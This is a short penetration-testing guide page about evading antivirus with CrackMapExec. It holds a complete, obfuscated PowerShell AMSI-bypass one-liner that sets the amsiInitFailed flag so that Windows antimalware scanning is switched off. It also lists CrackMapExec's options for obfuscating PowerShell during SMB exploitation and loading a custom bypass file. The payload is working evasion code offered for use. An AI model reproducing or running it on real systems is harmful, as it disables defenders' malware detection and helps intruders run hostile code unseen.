---
description: How to bypass AMSI using CrackMapExec...
cover: ../.gitbook/assets/GitBook Covers (1).png
coverY: 0
---

# 🔥 Anti Virus Bypass with CrackMapExec

Create a file called AV\_Bypass.txt and add the content:

{% code overflow="wrap" %}
```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```
{% endcode %}

### Powershell Obfuscation

The CrackMapExec tool includes an option for obfuscating PowerShell commands used during SMB exploitation.&#x20;

This option can be useful for avoiding detection by security tools that may be monitoring for suspicious PowerShell activity.

```
Options for PowerShell script obfuscation

  --obfs                Obfuscate PowerShell scripts
  --amsi-bypass FILE    File with a custom AMSI bypass
  --clear-obfscripts    Clear all cached obfuscated PowerShell scripts
```

```
// Some code
```
